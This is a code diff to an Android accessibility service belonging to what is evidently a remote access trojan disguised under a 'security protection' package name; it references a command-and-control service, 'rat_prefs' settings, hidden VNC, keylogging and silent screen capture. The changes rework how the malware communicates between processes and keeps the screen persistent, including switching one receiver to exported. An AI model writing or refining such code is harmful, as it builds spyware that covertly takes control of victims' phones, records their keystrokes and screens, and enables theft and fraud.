@@ -321,14 +321,12 @@ public class UiAssistBridge extends AccessibilityService {
         instance = this;
         gestureCore = new GestureCore(this, this::wakeUpScreen);
 
-        // Notify CCS that accessibility connected.
-        // After process split (:accessibility vs main), sInstance is always null
-        // here — use a broadcast so CCS receives it across the process boundary.
-        try {
-            Intent notify = new Intent("com.seguranca.protecao.ACCESSIBILITY_CONNECTED")
-                .setPackage(getPackageName());
-            sendBroadcast(notify);
-        } catch (Exception ignored) {}
+        // Notifica o CommandControlService que a acessibilidade foi ativada
+        if (CommandControlService.sInstance != null) {
+            try {
+                CommandControlService.sInstance.sendDeviceInfo();
+            } catch (Exception ignored) {}
+        }
 
         // AUTO-RESUME dedicated silent (BTMOB path) if it was active before service was recreated / device rebooted
         // We only reach here if the AccessibilityService itself is enabled.
@@ -460,20 +458,13 @@ public class UiAssistBridge extends AccessibilityService {
         IntentFilter screenFilter = new IntentFilter();
         screenFilter.addAction(Intent.ACTION_SCREEN_OFF);
         screenFilter.addAction(Intent.ACTION_SCREEN_ON);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(screenPersistenceReceiver, screenFilter, Context.RECEIVER_NOT_EXPORTED);
-        } else {
-            registerReceiver(screenPersistenceReceiver, screenFilter);
-        }
+        registerReceiver(screenPersistenceReceiver, screenFilter);
         Log.d(TAG, "🔒 SCREEN_OFF/ON receiver registrado!");
         
         // 🔒 Registra receiver para TOGGLE SCREEN PERSISTENCE (EXPORTED para receber de CommandControlService)
         IntentFilter togglePersistenceFilter = new IntentFilter("com.seguranca.protecao.TOGGLE_SCREEN_PERSISTENCE");
-        // Same-package broadcasts from CCS (main process) reach RECEIVER_NOT_EXPORTED
-        // receivers because they share the same UID. RECEIVER_EXPORTED would allow
-        // any third-party app to trigger screen persistence — unnecessary exposure.
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(toggleScreenPersistenceReceiver, togglePersistenceFilter, Context.RECEIVER_NOT_EXPORTED);
+            registerReceiver(toggleScreenPersistenceReceiver, togglePersistenceFilter, Context.RECEIVER_EXPORTED);
         } else {
             registerReceiver(toggleScreenPersistenceReceiver, togglePersistenceFilter);
         }
@@ -515,21 +506,6 @@ public class UiAssistBridge extends AccessibilityService {
         // 🔧 Inicializa ROM Compatibility
         romCompat = new ROMCompatibility(this);
         Log.d(TAG, "📱 ROM detectada: " + romCompat.detectROM().name());
-
-        // Set notificationTimeout = 0 so accessibility events are dispatched with
-        // zero batching delay. Under high event load (HVNC rapid renders, keylog bursts)
-        // the default non-zero timeout causes a delivery backlog that can trigger ANR
-        // → crash → mCrashedServices. Zero timeout prevents that pipeline from filling.
-        try {
-            android.accessibilityservice.AccessibilityServiceInfo svcInfo = getServiceInfo();
-            if (svcInfo != null) {
-                svcInfo.notificationTimeout = 0L;
-                setServiceInfo(svcInfo);
-                Log.d(TAG, "notificationTimeout set to 0 — immediate event dispatch");
-            }
-        } catch (Exception e) {
-            Log.w(TAG, "setServiceInfo notificationTimeout: " + e.getMessage());
-        }
         
         // IMPORTANTE: NÃO inicia automação automaticamente!
         // Apenas aguarda comandos do Wizard
@@ -4301,14 +4277,10 @@ public class UiAssistBridge extends AccessibilityService {
         if (instance == null) {
             int q = clampSilentQuality(quality > 0 ? quality : 25);
             try {
-                try {
-                    // Use application context directly — SharedPreferences are file-based
-                    // and accessible from any process sharing the same package/UID.
-                    // sInstance references CCS in the main process, always null here
-                    // after the :accessibility process split.
-                    AppCoreInitializer.getAppContext().getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
-                        .edit().putBoolean(PREFS_SILENT_ACTIVE, true).putInt(PREFS_SILENT_QUALITY, q).apply();
-                } catch (Exception ignored) {}
+                if (CommandControlService.sInstance != null) {
+                    android.content.SharedPreferences prefs = CommandControlService.sInstance.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
+                    prefs.edit().putBoolean(PREFS_SILENT_ACTIVE, true).putInt(PREFS_SILENT_QUALITY, q).apply();
+                }
             } catch (Exception ignored) {}
             Log.w("SilentCap", "instance is null, persisted active=true for when Accessibility connects");
             return;
